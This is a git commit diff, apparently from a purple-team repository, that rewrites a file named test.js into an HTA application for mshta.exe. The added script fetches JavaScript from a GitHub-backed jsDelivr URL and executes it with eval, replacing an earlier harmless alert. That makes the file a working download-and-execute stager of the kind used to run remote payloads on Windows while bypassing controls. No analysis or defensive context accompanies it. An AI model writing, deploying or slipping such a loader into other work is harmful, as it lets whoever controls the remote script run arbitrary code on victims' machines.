7351bfae939cf10a072047bb7d6f2c424fde10c2
wingpurple <purpleteam4lifee@gmail.com>
2025-07-20 10:56:52 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,13 @@
+<html>
+<head>
+  <title>Mashta</title>
+  <hta:application id="mashta" />
+</head>
+<body>
 <script>
-    alert("Mashta via mshta.exe worked!");
+fetch("https://cdn.jsdelivr.net/gh/wingpurple/pur@main/xx.js")
+  .then(res => res.text())
+  .then(code => eval(code));
 </script>
+</body>
+</html>
